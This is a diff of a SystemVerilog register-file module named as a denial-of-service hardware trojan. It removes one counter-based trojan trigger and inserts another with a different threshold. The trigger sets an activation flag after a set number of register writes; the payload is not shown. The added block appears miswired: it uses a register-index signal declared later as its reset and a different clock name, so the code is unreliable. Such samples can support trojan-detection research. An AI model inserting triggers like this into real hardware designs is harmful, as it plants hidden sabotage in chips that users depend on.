@@ -14,24 +14,6 @@ module RegisterFile_trojan_DoS(
     RegisterFileIF.RegisterFile port
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 18543;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (regWE) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     `RSD_STATIC_ASSERT(
         PSCALAR_NUM == PSCALAR_FP_NUM,
         "The number of int registers and the number of fp registers must be the same at present."
@@ -76,6 +58,23 @@ module RegisterFile_trojan_DoS(
         .ra( srcRegNum ),
         .rv( srcRegData )
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=8925)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 8925;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge regRstIndex) begin
+        if (!regRstIndex) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (regWE) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
     // - Initialization logic
     PRegNumPath regRstIndex;
